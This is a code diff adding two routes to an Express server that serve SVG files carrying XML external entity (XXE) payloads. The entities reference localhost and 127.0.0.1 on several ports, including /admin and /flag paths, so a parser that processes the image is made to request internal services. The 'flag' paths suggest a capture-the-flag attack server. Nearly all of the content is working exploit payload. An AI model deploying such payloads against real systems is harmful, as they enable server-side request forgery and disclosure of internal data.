@@ -17,6 +17,52 @@ app.get('/test', (req, res) => {
 });
 
 // 1. XXE Injection in SVG
+// Internal endpoint discovery
+app.get('/internal-discovery.svg', (req, res) => {
+  console.log('Internal discovery SVG requested');
+  const svgPayload = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY internal1 SYSTEM "http://localhost:8080/">
+  <!ENTITY internal2 SYSTEM "http://127.0.0.1:8080/">
+  <!ENTITY internal3 SYSTEM "http://localhost:5000/">
+  <!ENTITY internal4 SYSTEM "http://127.0.0.1:5000/">
+  <!ENTITY internal5 SYSTEM "http://localhost:80/">
+  <!ENTITY internal6 SYSTEM "http://127.0.0.1:80/">
+  <!ENTITY internal7 SYSTEM "http://localhost:3000/">
+  <!ENTITY internal8 SYSTEM "http://127.0.0.1:3000/">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <rect width="100" height="100" fill="blue"/>
+  <text x="10" y="10" font-size="3">
+    &internal1;&internal2;&internal3;&internal4;&internal5;&internal6;&internal7;&internal8;
+  </text>
+</svg>`;
+  res.setHeader('Content-Type', 'image/svg+xml');
+  res.send(svgPayload);
+});
+// Admin endpoints
+app.get('/admin-endpoints.svg', (req, res) => {
+  console.log('Admin endpoints SVG requested');
+  const svgPayload = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY admin1 SYSTEM "http://localhost:8080/admin">
+  <!ENTITY admin2 SYSTEM "http://127.0.0.1:8080/admin">
+  <!ENTITY admin3 SYSTEM "http://localhost:5000/admin">
+  <!ENTITY admin4 SYSTEM "http://127.0.0.1:5000/admin">
+  <!ENTITY admin5 SYSTEM "http://localhost:8080/flag">
+  <!ENTITY admin6 SYSTEM "http://127.0.0.1:8080/flag">
+  <!ENTITY admin7 SYSTEM "http://localhost:5000/flag">
+  <!ENTITY admin8 SYSTEM "http://127.0.0.1:5000/flag">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <rect width="100" height="100" fill="green"/>
+  <text x="10" y="10" font-size="3">
+    &admin1;&admin2;&admin3;&admin4;&admin5;&admin6;&admin7;&admin8;
+  </text>
+</svg>`;
+  res.setHeader('Content-Type', 'image/svg+xml');
+  res.send(svgPayload);
+});
 app.get('/flag-locations.svg', (req, res) => {
   console.log('Flag locations SVG requested');
   const svgPayload = `<?xml version="1.0" encoding="UTF-8"?>
